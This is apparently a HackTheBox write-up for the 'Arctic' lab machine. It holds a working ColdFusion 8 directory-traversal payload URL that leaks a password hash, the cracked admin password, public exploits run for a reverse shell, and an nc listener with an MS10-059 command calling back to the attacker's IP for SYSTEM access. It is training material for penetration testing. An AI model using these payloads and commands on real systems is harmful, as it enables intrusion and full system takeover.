# HackTheBox: Artic
https://www.hackthebox.com/machines/arctic

## 1. Enumeration

### 1.1. port scanning
Scan the ports of the target machine
```sudo nmap -T 4 -p- -A X.X.X.X ```

<img width="1905" height="491" alt="image" src="https://github.com/user-attachments/assets/f967f62b-8baf-4156-a907-4d3797210569" />
As observed in above screenshot, open ports discovered are 135, 8500 and 49154.

### 1.2. web subdirectory enumeration on Port 8500 (HTTP)

Manually enumerating the http port on 8500 on http://X.X.X.X:8500, it leads to discover the *Adobe ColdFusion 8 Administrator* login panel as per below screenshots.

<img width="674" height="260" alt="image" src="https://github.com/user-attachments/assets/2f792009-4974-402d-b76d-7323256efee7" />
<img width="919" height="410" alt="image" src="https://github.com/user-attachments/assets/dc939f97-3075-43d5-b041-c6bdd0839c97" />

The admin login panel can be found at *http://X.X.X.X:8500/CFIDE/administrator*.
The username "admin" is auto-filled by default.

## 2. Exploitation

### 2.1. researching vulnerability
Online researching *Adobe ColdFusion* :
<br/>
<br/>
(CVE-2010-2861)
- Found possible vulnerability CVE-2010-2861 ([https://nvd.nist.gov/vuln/detail/CVE-2019-9053](https://nvd.nist.gov/vuln/detail/cve-2010-2861)) that allows to perform directory traversal attack in the administrator console in Adobe ColdFusion 9.0.1 and earlier allow remote attackers to read arbitrary files.
- Found a publicly available exploit (https://www.exploit-db.com/exploits/14641) that allows attacker to retrieve password via directory traversal attack.
<br/>
<br/>
(CVE-2009-2265)
- Found possible vulnerability CVE-2009-2265 (https://nvd.nist.gov/vuln/detail/CVE-2009-2265) CVE-2009-2265 is a vulnerability related to multiple directory traversal flaws in FCKeditor before version 2.6.4.1, which is enabled by default in Adobe ColdFusion 8. 
- Found a publicly available exploit (https://www.exploit-db.com/exploits/50057) for an RCE.

### 2.2. exploiting vulnerability (CVE-2010-2861)
Instead of running the full exploit EDB-ID 14641 from the python script, the exploit can be performed simply by inputting the following URL into the browser: *http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en*

<img width="1819" height="772" alt="image" src="https://github.com/user-attachments/assets/7ea72915-32c7-4321-9ff4-3041b2c72d4f" />

As per the above screenshot, the page exposes a SHA1 password hash.

### 2.3. cracking password
Using crackstation (https://crackstation.net/), the hash can be cracked to expose a plaintext password "happyday"

<img width="1516" height="814" alt="image" src="https://github.com/user-attachments/assets/f6a06981-5f0d-485f-a14d-246826db6ed1" />

Then use the password to log into the admin panel.

<img width="1410" height="1214" alt="image" src="https://github.com/user-attachments/assets/af88eca8-c48d-49f3-97e4-7dd2a8990564" />


However, although the found credentials allows to log into the admin panel and can be noted, one may also look at alternative vulnerabilities/exploitation methods to be able to gain a direct intitial foothold on the server.


### 2.4. exploiting vulnerability (CVE-2009-2265)
The exploit script (50057.py) can be downloaded from https://www.exploit-db.com/exploits/50057.

Then setting the permissions to execute the script using ```chmod +x 50057.py``` and edit the script's four variables lhost, lport, rhost and rport to the attacker's IP address, attacker's listening port, target's IP address and target's HTTP port respectively.
In this case, the ports set are the default values. Then execute the script using ```python 50057.py```

<img width="906" height="754" alt="image" src="https://github.com/user-attachments/assets/e91d2269-f87e-449f-96c9-ef6bcd41ab77" />
<img width="970" height="534" alt="image" src="https://github.com/user-attachments/assets/06858308-beb7-4611-b8b2-0f865d3b36e3" />

As per above screenshot, this opens a reverse shell allowing to gain initial foothold on the server itself.

## 3. Post-Exploitation
### 3.1. post-exploitation enumeration

Run the command ```systeminfo``` to enumerate the Windows OS on the target server

<img width="741" height="724" alt="image" src="https://github.com/user-attachments/assets/1fb930d5-7118-43cd-96ca-88b70d6a5942" />

As per the above screenshot, copy and save its output into a text file named *sysinfo.txt* for example.

Obtain the Windows Exploit Suggester tool from: *https://github.com/bitsadmin/wesng*
<img width="714" height="154" alt="image" src="https://github.com/user-attachments/assets/dee96805-347d-4028-9ce0-561e9dee408d" />
</br>
Then update its definitions (if required)
</br>
<img width="634" height="99" alt="image" src="https://github.com/user-attachments/assets/cd8a06f5-f1fd-419c-97be-92883522bf78" />

Then run the script tool against the *sysinfo.txt* file (System Information) using the command: ```./wes.py sysinfo.txt```
<img width="762" height="423" alt="image" src="https://github.com/user-attachments/assets/ab770e0f-1ef4-4335-9524-3f5a1bed041d" />

As per screenshot below, observed that the target could be vulnerable to CVE-2010-2555 for privilege escalation.
<img width="875" height="181" alt="image" src="https://github.com/user-attachments/assets/92728224-3d2c-4a07-a56d-18288ced9a9a" />

### 3.2. privilege escalation using CVE-2010-2555
Online research on CVE-2010-2555 to find the following exploit: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059.
The executable *MS10-059.exe* is downloaded from Github and then uploaded to the target system.

Before executing *MS10-059.exe* on the target system, open a listener on the attacker machine using: ```nc -lvnp 5555```
<img width="412" height="91" alt="image" src="https://github.com/user-attachments/assets/4503fd9f-78aa-4c14-b773-ee7dbe6de540" />


Then execute *MS10-059.exe* on the target system using the attacker's IP and listening port by running the command: ```MS10-059.exe X.X.X.X 5555```
<img width="1894" height="148" alt="image" src="https://github.com/user-attachments/assets/3efb4c34-b727-4797-8be0-50fd9b300100" />

<img width="808" height="286" alt="image" src="https://github.com/user-attachments/assets/0947602f-004f-4a1e-ab2c-b2f65bacf4da" />

As per above screenshot, a privileged reverse shell (as NT AUTHORITY\SYSTEM) is obtained.









